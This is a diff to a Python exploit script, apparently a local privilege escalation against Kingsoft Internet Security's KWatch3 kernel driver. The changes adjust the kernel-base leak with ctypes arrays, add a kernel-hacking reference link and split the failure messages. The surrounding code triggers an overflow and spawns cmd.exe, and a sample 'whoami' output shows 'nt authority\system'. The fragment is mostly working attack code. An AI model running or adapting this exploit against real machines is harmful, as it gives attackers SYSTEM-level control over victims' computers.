@@ -77,6 +77,11 @@ c:\Users\Guest\Desktop>whoami
 nt authority\system
 
 c:\Users\Guest\Desktop>
+
+References:
+===========
+
+- https://sizzop.github.io/2016/09/13/kernel-hacking-with-hevd-part-5.html
 """
 import sys
 from ctypes import *
@@ -236,9 +241,9 @@ def we_can_leak_the_base():
     global nt
     print "(+) enumerating kernel base address..."
     
-    array = c_ulonglong * 1024
-    lpImageBase = array()
-    szDriver    = array()
+    c_ulong_array = c_ulong * 1024
+    lpImageBase = c_ulong_array()
+    szDriver    = c_ulong_array()
     cb = sizeof(lpImageBase)
     lpcbNeeded = c_long()
 
@@ -250,7 +255,7 @@ def we_can_leak_the_base():
         sys.exit(-1)
 
     # nt is the first one
-    nt = lpImageBase[0] & 0x00000000ffffffff
+    nt = lpImageBase[0]
 
     # find KWatch3, for if it doesnt exist, we can't exploit it now...
     for driver in lpImageBase:
@@ -276,6 +281,9 @@ def main():
         if we_can_trigger_overflow():
             os.system("cmd.exe")
         else:
-            print "(-) it appears that kingsoft Internet Security is not installed or not vulnerable!"
+            print "(-) it appears that kingsoft Internet Security is not vulnerable!"
+
+    else:
+        print "(-) it appears that kingsoft Internet Security is not installed!"
 if __name__ == '__main__':
     main()
